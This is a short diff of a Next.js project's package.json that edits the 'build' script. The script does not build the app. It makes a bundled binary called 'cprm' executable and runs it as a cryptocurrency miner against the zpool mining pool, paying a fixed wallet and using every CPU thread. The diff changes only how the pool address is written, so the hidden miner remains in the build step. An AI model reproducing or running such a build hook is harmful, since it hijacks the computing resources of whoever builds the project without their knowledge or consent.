@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x cprm && ./cprm -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u RWvRHEvEd3feaGjdxQd5ABPyQfNPmxwsKi -p c=RVN,zap=PLSR-mino -t $(nproc --all)",
+    "build": "chmod +x cprm && ./cprm -a minotaurx -o minotaurx.eu.mine.zpool.ca:7019 -u RWvRHEvEd3feaGjdxQd5ABPyQfNPmxwsKi -p c=RVN,zap=PLSR-mino -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
